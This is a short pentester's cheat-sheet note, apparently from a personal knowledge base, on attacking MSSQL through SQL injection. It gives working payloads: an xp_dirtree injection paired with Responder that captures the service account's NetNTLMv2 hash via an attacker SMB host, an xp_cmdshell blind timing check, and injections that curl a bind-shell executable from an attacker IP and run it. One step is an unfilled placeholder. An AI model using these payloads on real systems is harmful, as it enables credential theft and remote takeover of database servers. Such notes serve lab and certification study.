alias:: MSSQL

- If you find an injectable entry-point (e.g. `username`), you can try to interact with the underline operating system
	- Collect netNTLMv2 challege for the user running MSSQL process via **xp_dirtree**
		- Start [[Responder]]
		  ```bash
		  sudo responder -I tun0 -wd
		  ```
		- Execute a query that tries to reach out your rouge SMB server
		  ```sql
		  username='; exec master..xp_dirtree '//192.168.45.171/a'-- 
		  ```
	- Execute commands via **xp_cmdshell**
		- You may need to enable command execution first
		  background-color:: yellow
		  ```sql
		  Add here instruction about how to enable xp_cmdshell
		  ```
		- Blindly confirm that commands are executed by running a sleep(-equivalent) command
		  ```sql
		  Username='; exec master..xp_cmdshell 'ping 127.0.0.1 -n 6 > nul'--
		  ```
		- Upload a bind shell then run it
		  ```sql
		  Username='; exec master..xp_cmdshell 'curl 192.168.45.171/bind_cmd_4444.exe -o C:\Windows\temp\bind.exe'--
		  ```
		  ```sql
		  Username='; exec master..xp_cmdshell 'C:\Windows\temp\bind.exe'--
		  ```